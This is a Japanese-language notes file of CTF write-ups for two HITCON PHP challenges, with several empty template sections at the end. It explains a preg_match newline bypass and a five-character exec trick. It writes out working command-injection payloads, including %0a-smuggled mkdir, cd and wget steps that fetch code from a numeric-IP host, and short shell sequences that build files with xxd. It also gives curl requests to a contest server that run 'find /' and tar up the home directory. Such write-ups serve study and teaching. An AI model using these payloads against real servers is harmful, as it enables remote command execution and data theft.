<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [writeup](#writeup)
  - [PHP "preg_match" with "%0a" (hitcon2015 babyfirst)](#php-preg_match-with--hitcon2015-babyfirst)
  - [](#)
  - [](#-1)
  - [](#-2)
  - [](#-3)
  - [](#-4)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# writeup
## PHP "preg_match" with "%0a" (hitcon2015 babyfirst)
https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst  
https://github.com/pwning/public-writeup/blob/master/hitcon2015/web100-babyfirst/writeup.md  
- **entrypoint**  
以下のソースが与えられる。  
`if ( !preg_match('/^\w+$/', $args[$i]) )`で行頭から行末までが`\w`(abcdefghijklmnopqrstuvwxyz0123456789_)の時に`/bin/orange`コマンドと結合する。  
`preg_match`の`^ $`では改行文字`%0a`を入れると「行頭から改行文字まで」に範囲が変わってしまって、改行文字以降はチェックしなくなる！  
https://qiita.com/tadsan/items/81b2925b3ed03ae6b7e0  

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```
以下のようにすることで`%0a`以降のコマンドを普通に実行できる。  
配列にしてるのは`$args[$i]`で入力が配列として期待されているから。  
```txt
http://localhost/
?args[0]=x%0a
&args[1]=mkdir
&args[2]=orange%0a
&args[3]=cd
&args[4]=orange%0a
&args[5]=wget
&args[6]=846465263%0a
```
- **payload**  
```txt
http://localhost/
?args[0]=x%0a
&args[1]=mkdir
&args[2]=orange%0a
&args[3]=cd
&args[4]=orange%0a
&args[5]=wget
&args[6]=846465263%0a
```
## PHP "exec(cmd) len(cmd)<= 5"(Hitcon CTF 2017 Quals: Baby First Revenge)
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/  
https://hack.more.systems/writeup/2017/11/06/hitconctf-babyfirstrevenge/  
- **entrypoint**  
以下のPHPソースが与えられる。つまり、5文字以内でFlagをゲットする必要がある。  
```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```
いろいろ解法があるらしいけど、以下のようにして`HELLO`という文字列を`z`というファイルに子の手順で書き込めるらしい。  
`>4845`,`ls>>y`で`y`というファイルに`4845`という値が書き込まれる。  
こんな調子でyというファイルにHEXで書き込んでいく。  
`*`でファイルが展開されて最終的に`xxd -p -r y z`みたいにASCIIに直して書きこむ。 
これでリバースシェルも書き込んでFlagゲット。  
```txt
>4845
ls>>y
rm 4*
>4c4c
ls>>y
rm 4*
>4f
ls>>y
rm 4*
>z
>-p
>-r
xxd *
```
別のやり方として、以下のように`*`でファイルを展開してコマンドとして実行できるらしい！  
以下だと`find /`が実行できる。  
`/home/fl4444g/README.txt`が得られるらしい。  
```txt
curl 'http://52.199.204.34/?cmd=>find'
curl 'http://52.199.204.34/?cmd=*%20/>x'
```
以下で`tar zcf zzz /h*`でzzzというファイルを作成してそれをダウンロードしてFlagゲット。(この後もいろいろあるけど同じことなので割愛)  
```txt
curl 'http://52.199.204.34/?cmd=>tar'
curl 'http://52.199.204.34/?cmd=>zcf'
curl 'http://52.199.204.34/?cmd=>zzz'
curl 'http://52.199.204.34/?cmd=*%20/h*'
```
- **payload**  
```txt
>4845
ls>>y
rm 4*
>4c4c
ls>>y
rm 4*
>4f
ls>>y
rm 4*
>z
>-p
>-r
xxd *
```
```txt
curl 'http://52.199.204.34/?cmd=>tar'
curl 'http://52.199.204.34/?cmd=>zcf'
curl 'http://52.199.204.34/?cmd=>zzz'
curl 'http://52.199.204.34/?cmd=*%20/h*'
```
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  

# メモ
